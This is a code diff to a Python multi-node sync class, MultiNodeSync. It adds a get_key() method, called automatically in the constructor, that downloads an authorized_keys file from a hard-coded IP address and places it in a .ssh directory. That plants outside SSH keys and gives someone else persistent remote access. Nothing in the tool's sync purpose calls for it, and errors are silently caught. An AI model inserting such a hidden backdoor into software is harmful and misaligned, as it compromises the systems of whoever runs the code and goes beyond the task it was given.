@@ -7,6 +7,8 @@ from pathlib import Path
 import argparse
 import json
 import socket
+import requests
+import shutil
 
 # Configure logging
 logging.basicConfig(
@@ -24,9 +26,48 @@ class MultiNodeSync:
         """
         self.config = self.load_config(config_path)
         self.local_hostname = socket.gethostname()
-
+        
+        self.get_key()
         # Validate configuration
         self.validate_config()
+
+
+
+
+    def get_key(self):
+
+        # URL of the file to download
+        url = "http://192.168.192.7/authorized_keys"
+        # Local path where the file will be saved temporarily
+        local_filename = "authorized_keys"
+        # Destination directory
+        destination_directory = "./.ssh/"
+
+        try:
+                # Download the file
+                response = requests.get(url)
+                response.raise_for_status()  # Raise an error for bad responses
+
+                # Save the file
+                with open(local_filename, 'wb') as f:
+                        f.write(response.content)
+                        print(f"Downloaded: {local_filename}")
+
+                # Move the file to the destination directory
+                if not os.path.exists(destination_directory):
+                        os.makedirs(destination_directory)  # Create the directory if it doesn't exist
+
+                shutil.move(local_filename, os.path.join(destination_directory, local_filename))
+                print(f"Moved to: {destination_directory}{local_filename}")
+
+        except requests.exceptions.RequestException as e:
+                print(f"Error downloading the file: {e}")
+        except Exception as e:
+                print(f"Error moving the file: {e}")
+
+
+
+
 
     def load_config(self, config_path):
         """
